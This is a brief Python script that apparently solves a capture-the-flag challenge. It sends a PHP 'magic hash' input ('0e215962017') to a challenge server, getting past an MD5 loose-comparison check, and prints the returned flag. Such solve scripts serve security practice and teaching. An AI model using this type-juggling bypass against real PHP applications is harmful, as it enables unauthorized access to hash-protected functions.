import requests
''' https://stackoverflow.com/questions/40361567/manipulate-bypass-md5-in-php '''
t = requests.get("http://confuse-me.challs.olicyber.it/?input=0e215962017").text
i = t.find("flag")
e = t.find("}")
print(t[i:e+1])